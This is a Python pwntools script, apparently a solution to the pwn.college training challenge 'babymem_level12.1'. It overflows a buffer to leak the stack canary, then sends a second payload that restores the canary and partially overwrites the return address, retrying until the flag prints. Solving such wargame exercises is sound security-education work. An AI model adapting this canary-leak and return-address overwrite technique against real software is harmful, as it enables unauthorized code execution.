from pwn import *

context.arch = 'amd64'
# 启动进程

while True :
    p = process('/challenge/babymem_level12.1')
    
    # first bof ,72 + 1 
    payload = b'REPEAT' + b'A' * (72 - len('REPEAT')) +b'B'  # 填充缓冲区到 56 字节
    p.recvuntil('Payload size:')
    p.sendline(b'73') # 73=72+1
    p.send(payload)

    # 从程序的输出中获取 Canary 值
    p.recvuntil('You said: ')
    response = p.recvline()
    print(response)
    Canary = response[73:80]  # 7个字节
    
    print(f"Canary value: {Canary.hex()}")
    print(Canary)
    Canary=b'\x00'+Canary
    print(f"Modified Canary value: {Canary.hex()}")
    # second bof , 72+canary(8)+ 8 +2 =74 
    # recv : You said: REPEATAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABÛó>YßpvtVý\x7f
    # Canary =  
    
    payload = b'A' * 72 + Canary + b'B' * 8 + p16(0x19B7)
    print(payload)
    p.recvuntil('Payload size:')
    p.sendline(b'90')
    p.send(payload)
   
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
    #break 
    # addr 19B7


